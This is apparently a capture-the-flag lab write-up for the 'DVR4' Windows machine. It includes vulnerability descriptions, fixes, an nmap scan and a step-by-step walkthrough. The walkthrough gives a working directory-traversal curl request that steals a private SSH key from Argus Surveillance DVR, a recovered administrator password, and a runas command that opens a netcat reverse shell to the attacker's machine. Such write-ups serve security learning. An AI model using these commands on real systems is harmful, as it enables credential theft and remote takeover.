---
Alias: DVR-4
Date: 8/21/2022
Platform: Windows
Difficulty: Intermediate
Tags: #WindowsDirectoryTraversalExploit #URLencodedCharacters #WindowsDirectoryTraversalPrivateSSHKey #FindHiddenWindowsDirectorys #WindowsProgramConfigurationFile #IdentifyHashID #RunProgramFromDifferentWindowsUser #RunasPrivilegeEscalation
Status: Finished
IP: 192.168.122.179
---

# {{DVR4}}


# Resolution summary
- Navigated to webpage found on port 8080
- Located a user named "viewer"
- Located CVE 2018-15745 directory traversal exploit for the program Argus Surveillance running on port 8080
- The directory traversal exploit helped to uncover a private SSH key
- Utilized found user "viewer" and private SSH key to login to a windows shell
- Found a user "Administrator" and a hashed/encrypted password in Argus Surveillance DVR configuration file
- Found a weak password encryption script for Argus Surviellance utilizing searchsploit
- Referencing the weak password encryption script I was able to find all but one character of the password as the script stated it did not add special characters
- Researched the syntax to utilize to login to a program as a different user
- Utilized the found "runas" syntax to login to a windows shell as Administrator

## Improved skills
- Command for searching for hidden directories using CMD
- Learned what certain URL encoded characters were
- Learned how to to run a program as a different user in windows command line


## Used tools
- nmap
- runas

### **Vulnerability Explanation:** Initial Access

#### CVE 2018–15745: Argus Surveillance DVR 4.0.0.0: Directory Traversal 

#### Title: Directory Traversal in Argus Surveillance DVR

#### Type of Vulnerability: Directory Traversal

#### CWE Reference: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

#### Proposal for CVSS Score: 7.5 (High)

- **CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N**
- This scoring reflects the vulnerability's network accessibility, low attack complexity, and no required privileges or user interaction. The impact is high concerning confidentiality, as it allows unauthorized access to files outside the intended directory.

#### Generic Description:

The directory traversal vulnerability in Argus Surveillance DVR version 4.0.0.0 allows remote attackers to read arbitrary files on the system. This vulnerability arises when input data is used to construct filesystem paths without properly sanitizing sequences like "../" that can navigate directories upward. Attackers can exploit this by crafting specially designed requests to the server that include ".." sequences to traverse to directories or files that should not be accessible, potentially leading to information disclosure, such as configuration files, databases, or other sensitive data.

#### Specific Description:

In the case of Argus Surveillance DVR 4.0.0.0, the vulnerability is exploited through the web interface that the DVR provides for remote access and management. The flaw lies in the lack of proper sanitization of user-supplied input in the web application, particularly in parameters that are meant to specify file paths for legitimate DVR functionalities. By manipulating these parameters, an attacker can traverse the server's directory structure and access files that are outside the web root directory. This could expose sensitive information that could be leveraged for further attacks or to undermine the security of the surveillance system.


### **Vulnerability Fix:** Initial Access

#### CVE 2018–15745: Argus Surveillance DVR 4.0.0.0: Directory Traversal 


1. **Patch or Update Software:** Check for and apply updates from the vendor that address this vulnerability. If no patch is available, consider contacting the vendor for advice or a workaround.
    
2. **Input Validation:** Ensure that all user-supplied input is validated and sanitized to remove or encode potentially dangerous characters. Pay special attention to inputs that are used in file or directory path specifications.
    
3. **Use Security Controls:** Implement security controls that prevent web applications from accessing files outside of predetermined directories. This can include both server-side checks and proper configuration of web server software.
    
4. **Employ a Web Application Firewall (WAF):** A Web Application Firewall can help detect and block exploitation attempts of directory traversal vulnerabilities by filtering out malicious inputs.
    
5. **Limit User Privileges:** On the server running Argus Surveillance DVR, ensure that the software operates with the least privileges necessary. Restricting the permissions can limit the impact of a directory traversal attack.
    
6. **Regular Security Audits:** Conduct regular security audits of your web applications and server configurations to identify and mitigate potential vulnerabilities, including but not limited to directory traversal flaws.
    
7. **Monitoring and Logging:** Implement monitoring and logging of access and error logs to detect unusual patterns that might indicate attempted exploitation. Regular review of these logs can aid in early detection of a breach.
    
8. **Education and Awareness:** Train development and IT staff on the importance of secure coding practices and the common types of web vulnerabilities to prevent similar issues in the future.
    
9. **Network Segmentation:** Isolate critical systems, like surveillance DVRs, from the rest of the network to reduce the risk of lateral movement by attackers within the network.
    

By following these remediation steps, users and administrators of Argus Surveillance DVR systems can mitigate the risk posed by this directory traversal vulnerability and protect their systems against unauthorized access and information disclosure.


### **Vulnerability Explanation:**  Privilege Escalation

## DVR 4.0 Weak Password Encryption Script 

#### Title: Weak Password Encryption in Argus Surveillance DVR

#### Type of Vulnerability: Use of a Broken or Risky Cryptographic Algorithm

#### CWE Reference: CWE-326: Inadequate Encryption Strength

#### Proposal for CVSS Score: 5.9 (Medium)

- **CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N**
- The score is based on the vulnerability being exploitable over the network (although with high complexity), not requiring privileges or user interaction, and leading to a high impact on confidentiality without directly affecting integrity or availability.

#### Generic Description:

The weak password encryption vulnerability in Argus Surveillance DVR version 4.0 arises due to the use of a cryptographic algorithm that is either inherently weak or improperly implemented. This flaw makes it possible for attackers to decrypt passwords stored by the system, potentially allowing unauthorized access to the surveillance system. Weak or broken encryption algorithms can be brute-forced or bypassed with relative ease, undermining the security of the system and the data it protects.

#### Specific Description:

In Argus Surveillance DVR 4.0, passwords are encrypted using an algorithm that does not provide sufficient security. The specifics of the algorithm (e.g., MD5, simple base64 encoding, etc.) may not be robust against modern decryption techniques and computational power, making it feasible for attackers to recover plaintext passwords. Such vulnerabilities are particularly critical in systems like surveillance DVRs, where access control is a primary line of defense. An attacker gaining access to surveillance feeds can lead to privacy violations, unauthorized monitoring, or tampering with security footage.

### **Vulnerability Fix:**  Privilege Escalation

## DVR 4.0 Weak Password Encryption Script 

1. **Update the System:** Check for updates or patches from the vendor that address the weak password encryption issue. Upgrading to a version that uses a strong encryption algorithm for storing passwords is crucial.
    
2. **Use Strong Encryption Algorithms:** If a custom solution is necessary, ensure that passwords are encrypted using strong, industry-standard algorithms, such as AES (Advanced Encryption Standard) for encryption, and bcrypt, scrypt, or Argon2 for password hashing. These algorithms provide significantly more protection against brute-force attacks.
    
3. **Implement Additional Access Controls:** Beyond relying on encrypted passwords, implement additional layers of security for system access. This can include multi-factor authentication (MFA), IP whitelisting, and physical security measures.
    
4. **Regular Security Audits and Vulnerability Assessments:** Conduct regular security audits and vulnerability assessments of your systems to identify and mitigate potential encryption weaknesses.
    
5. **Educate Users on Strong Password Policies:** Encourage the use of strong, complex passwords among system users. Consider implementing password strength requirements to improve security.
    
6. **Monitor for Unauthorized Access:** Implement monitoring to detect and alert on unauthorized access attempts. Early detection can prevent or mitigate damage from potential breaches.
    
7. **Data Protection Policies:** Establish comprehensive data protection policies that cover not only password management but also data storage, transmission, and access controls.
    
8. **Vendor Communication:** Engage with the system vendor about security concerns and inquire about forthcoming security enhancements. Vendor collaboration can help prioritize security updates that address encryption and other vulnerabilities.
    
9. **Backup and Disaster Recovery:** Maintain regular backups of critical data and have a disaster recovery plan in place. In the event of a security breach, this ensures that you can restore functionality with minimal downtime.
    

Addressing the weak password encryption vulnerability in Argus Surveillance DVR systems requires a multifaceted approach that includes both technical fixes and comprehensive security practices. By implementing strong encryption and enhancing overall system security, organizations can protect against unauthorized access and maintain the integrity of their surveillance operations.

---

# Information Gathering
Scanned all TCP ports:
```bash
# Nmap 7.92 scan initiated Fri Aug 12 07:04:21 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/brian/Downloads/Proving_Grounds/DVR4/results/192.168.122.179/scans/_full_tcp_nmap.txt -oX /home/brian/Downloads/Proving_Grounds/DVR4/results/192.168.122.179/scans/xml/_full_tcp_nmap.xml 192.168.122.179
Warning: 192.168.122.179 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.122.179
Host is up, received user-set (0.17s latency).
Scanned at 2022-08-12 07:04:21 PDT for 934s
Not shown: 65485 closed tcp ports (conn-refused)
PORT      STATE    SERVICE       REASON      VERSION
22/tcp    open     ssh           syn-ack     Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey: 
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsljcHdJN7STx92SFZR/dtzDsO0v1blAoUfqWva1WJD9WXeKe0S9Oeg4L1eXC6ik5O6+lE7SRqz7Qiudrhk9CXxB0tmmX2SpZKMg1l01wmO5QEhpeuhDOb062dCDc1byOkpbBJq93afwVOEiaCOMVVjnwvJ5MFmZQzBcb02rmHKH7+o2BjMukTA8coWhCc2cqyEgPA031zSYCkdzxLlgHJMUlbDDtD0D143rLPZ6CtP5Nbxpbt/2Hj3thq7GQzToNdgCYCEIMg6Gs4xYHLO4lKcOb92wFdEtx+hA7xFxGOldfmEU4f3jyDSFazolJU4TxzewQ/kIi1W4Cj+tarEVTC6sBUAhHZSLAj5nkz7rljJIXiM8hYp6VMcpsqa1dtlwspeiFXL2RizuQgUzabzsQGmZ0Yu501ieYy1i7mIEWzO2UUx3tnCn9YKAh30jYQQvXYB+oUGuQqDIQh1f0Ds/Jd1IkFMJ8EZQ8Iaoa1UVpxupdZ8jtBm3BKT5+sVtJ4jwE=
|   384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
|_ecdsa-sha2-nistp384 AAAAE2VjZHNhLXNoYTItbmlzdHAzODQAAAAIbmlzdHAzODQAAABhBEqSs/ONYXuZGcGBUkLstnAWRP6wNsuJz6yUtmYymbBUobb797y3tkgWkCUhaDsB3z8XzhgoyCXS6MuXqF3FmiapitvPj1ig5TnVnHRvzuB2beKi/cH2XBduyaaKO6AORg==
135/tcp   open     msrpc         syn-ack     Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack     Microsoft Windows netbios-ssn
174/tcp   filtered mailq         no-response
445/tcp   open     microsoft-ds? syn-ack
850/tcp   filtered unknown       no-response
1048/tcp  filtered neod2         no-response
2685/tcp  filtered mpnjsocl      no-response
2818/tcp  filtered rmlnk         no-response
3182/tcp  filtered bmcpatrolrnvu no-response
3871/tcp  filtered avocent-adsap no-response
4322/tcp  filtered trim-event    no-response
5040/tcp  open     unknown       syn-ack
7680/tcp  open     tcpwrapped    syn-ack
8080/tcp  open     http-proxy    syn-ack
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Argus Surveillance DVR
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0"> 
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0"> 
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
|_http-favicon: Unknown favicon MD5: 283B772C1C2427B56FC3296B0AF42F7C
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
9661/tcp  filtered unknown       no-response
10108/tcp filtered unknown       no-response
12168/tcp filtered cawas         no-response
14363/tcp filtered unknown       no-response
16988/tcp filtered unknown       no-response
20350/tcp filtered unknown       no-response
22411/tcp filtered unknown       no-response
27638/tcp filtered unknown       no-response
30270/tcp filtered unknown       no-response
36239/tcp filtered unknown       no-response
37064/tcp filtered unknown       no-response
38335/tcp filtered unknown       no-response
38950/tcp filtered unknown       no-response
40294/tcp filtered unknown       no-response
41441/tcp filtered unknown       no-response
45566/tcp filtered unknown       no-response
49664/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49665/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49666/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49667/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49668/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49669/tcp open     msrpc         syn-ack     Microsoft Windows RPC
51167/tcp filtered unknown       no-response
51575/tcp filtered unknown       no-response
51597/tcp filtered unknown       no-response
51714/tcp filtered unknown       no-response
52334/tcp filtered unknown       no-response
52841/tcp filtered unknown       no-response
53279/tcp filtered unknown       no-response
56109/tcp filtered unknown       no-response
59211/tcp filtered unknown       no-response
63395/tcp filtered unknown       no-response
64414/tcp filtered unknown       no-response
64557/tcp filtered unknown       no-response
65364/tcp filtered unknown       no-response
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=9%D=8/12%Time=62F6610B%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,451,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20Keep-Alive
SF:\r\nKeep-Alive:\x20timeout=15,\x20max=4\r\nContent-Type:\x20text/html\r
SF:\nContent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\r\n<TITLE>\r\nArgus\x2
SF:0Surveillance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20http-equiv=\"Content-T
SF:ype\"\x20content=\"text/html;\x20charset=ISO-8859-1\">\r\n<meta\x20name
SF:=\"GENERATOR\"\x20content=\"Actual\x20Drawing\x206\.0\x20\(http://www\.
SF:pysoft\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frameset\x20frameborder=\"no
SF:\"\x20border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\x20<frame\x20name=\"To
SF:p\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"Cam
SF:erasTopFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x2
SF:0\r\n\x20\x20<frame\x20name=\"ActiveXFrame\"\x20frameborder=\"0\"\x20sc
SF:rolling=\"auto\"\x20noresize\x20src=\"ActiveXIFrame\.html\"\x20marginwi
SF:dth=\"0\"\x20marginheight=\"0\">\r\n\x20\x20<frame\x20name=\"CamerasTab
SF:le\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"Ca
SF:merasBottomFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x2
SF:0\x20\r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p>This\x20page\x20uses\
SF:x20frames,\x20but\x20your\x20browser\x20doesn't\x20support\x20them\.</p
SF:>\r\n\x20\x20</noframes>\r")%r(HTTPOptions,451,"HTTP/1\.1\x20200\x20OK\
SF:r\nConnection:\x20Keep-Alive\r\nKeep-Alive:\x20timeout=15,\x20max=4\r\n
SF:Content-Type:\x20text/html\r\nContent-Length:\x20985\r\n\r\n<HTML>\r\n<
SF:HEAD>\r\n<TITLE>\r\nArgus\x20Surveillance\x20DVR\r\n</TITLE>\r\n\r\n<me
SF:ta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=IS
SF:O-8859-1\">\r\n<meta\x20name=\"GENERATOR\"\x20content=\"Actual\x20Drawi
SF:ng\x206\.0\x20\(http://www\.pysoft\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<
SF:frameset\x20frameborder=\"no\"\x20border=\"0\"\x20rows=\"75,\*,88\">\r\
SF:n\x20\x20<frame\x20name=\"Top\"\x20frameborder=\"0\"\x20scrolling=\"aut
SF:o\"\x20noresize\x20src=\"CamerasTopFrame\.html\"\x20marginwidth=\"0\"\x
SF:20marginheight=\"0\">\x20\x20\r\n\x20\x20<frame\x20name=\"ActiveXFrame\
SF:"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"Activ
SF:eXIFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\r\n\x20\x2
SF:0<frame\x20name=\"CamerasTable\"\x20frameborder=\"0\"\x20scrolling=\"au
SF:to\"\x20noresize\x20src=\"CamerasBottomFrame\.html\"\x20marginwidth=\"0
SF:\"\x20marginheight=\"0\">\x20\x20\r\n\x20\x20<noframes>\r\n\x20\x20\x20
SF:\x20<p>This\x20page\x20uses\x20frames,\x20but\x20your\x20browser\x20doe
SF:sn't\x20support\x20them\.</p>\r\n\x20\x20</noframes>\r");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| smb2-time: 
|   date: 2022-08-12T14:19:29
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25270/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 22583/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 48876/udp): CLEAN (Timeout)
|   Check 4 (port 49443/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 12 07:19:55 2022 -- 1 IP address (1 host up) scanned in 934.35 seconds
```

Enumerated open TCP ports:
```bash
8080
```

Enumerated top 200 UDP ports:
```bash

```

---

## Port 8080

- We browse to "http://192.168.109.179:8080" based on the NMAP scan, and I discovered the following webpage:
  
![](Images/Pasted%20image%2020221009165921.png)

- We discover the user viewer by navigating to the "Users" section.
  
![](Images/Pasted%20image%2020221009183244.png)


---

# Exploitation
## CVE 2018-15745 - Argus Surveillance DVR 4.0.0.0 - Directory Traversal

- We discover the following exploit by typing "searchsploit Argus Surveillance":
  
![](Images/Pasted%20image%2020221009190548.png)

- We enter “searchsploit -m windows_x86/webapps/45296.txt” to download the exploit onto our Kali machine.
  
![](Images/Pasted%20image%2020221009190910.png)

- We look into “url encoded characters” on Google and discover the following webpage, which indicates the character “/” url encoded is %2F:
  
![](Images/Pasted%20image%2020221009191130.png)

![](Images/Pasted%20image%2020221009191245.png)

![](Images/Pasted%20image%2020221009191343.png)
#URLencodedCharacters

- On the Kali machine, we enter the following to get the private SSH key for the user "viewer" that we previously located:

"curl "http://WEBACCOUNT.CGI://[Kali IP]:8080/OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F%2Essh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" > id_rsa"

![](Images/Pasted%20image%2020221009191611.png)
#WindowsDirectoryTraversalPrivateSSHKey

- We discover the following private SSH key by typing "cat id_rsa":
      
![](Images/Pasted%20image%2020221009191813.png)

- We open an SSH session as user “viewer” by typing “ssh viewer@192.168.122.179 -i id_rsa”:

  ![](Images/Pasted%20image%2020221009191954.png)


---

# Privilege Escalation
## Local Enumeration

- The following Python script with "weak password encryption" was discovered by us using the prior searchploit we conducted for Argus surveillance:
  
![](Images/Pasted%20image%2020221009192206.png)

- To copy the Python script to our Kali computer, we type "searchsploit -m windows/local/50130.py".
  
- We type "cat 50130.py" and the contents appeared as follows:
  
![](Images/Pasted%20image%2020221009192437.png)

- We try a privilege escalation script, but nothing seems worth looking into.

- To locate any hidden files or directories, we type "dir /a" into the C: directory. This allowed us to locate the hidden directory ProgramData.

![](Images/Pasted%20image%2020221009192857.png)
#FindHiddenWindowsDirectorys

- We navigate to the "ProgramData" directory and discover the following directory:
  
![](Images/Pasted%20image%2020221009193059.png)

- We access the "PY_Software" directory.
  
-We locate and navigate to the "Argus Surveillance DVR" directory:

![](Images/Pasted%20image%2020221009193752.png)

- Next, we locate the configuration file DVRParams (.ini):
  
![](Images/Pasted%20image%2020221009194221.png)
#WindowsProgramConfigurationFile 

- After that, we enter "type DVRParams.ini" to access the configuration file's contents and discover the hashed or encrypted password "ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8" along with the "administrator" user:

![](Images/Pasted%20image%2020221009201025.png)

- When trying to find the hash, we type "hashid ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8" but returned an unknown hash instead:
  
![](Images/Pasted%20image%2020221009201200.png)
	#IdentifyHashID

- We recall the previously discovered "weak password encryption" script/exploit. We enter the encrypted password into the script and type "vim 50130.py":
  
![](Images/Pasted%20image%2020221009201411.png)

- After entering "python 50130.py" to launch the script, "14WatchD0g" was discovered to be the password that had been largely decoded. Even so, the last character string is unintelligible to the script:
  
![](Images/Pasted%20image%2020221009201544.png)

- We discover that the programmer was "too lazy to add special characters" after reading the script:
  
![](Images/Pasted%20image%2020221009201710.png)

- We locate the installed netcat executable by navigating to the viewer users directory:
  
![](Images/Pasted%20image%2020221009202007.png)

- We configure a netcat listener on port 443.
  
- We looked into the syntax needed to utilize the "runas" command in order to run a command as a different user.
  
![](Images/Pasted%20image%2020221009202220.png)

- The webpage instructs users to execute the command "runas /user:admin "C:\Windows\notepad.exe"."

![](Images/Pasted%20image%2020221009202314.png)
- [ ] 
## Privilege Escalation vector
## Runas command to login with a different user in CMD

- We type the following command and receive a CMD prompt running as Administrator:

"runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443"

- We are prompted for the administrator's password.

- We tried every special character after discovering the partial password "14WatchD0g" until it finally worked and we received a CMD prompt as Administrator:

![](Images/Pasted%20image%2020221009202519.png)

![](Images/Pasted%20image%2020221009202604.png)


#RunProgramFromDifferentWindowsUser #RunasPrivilegeEscalation

---

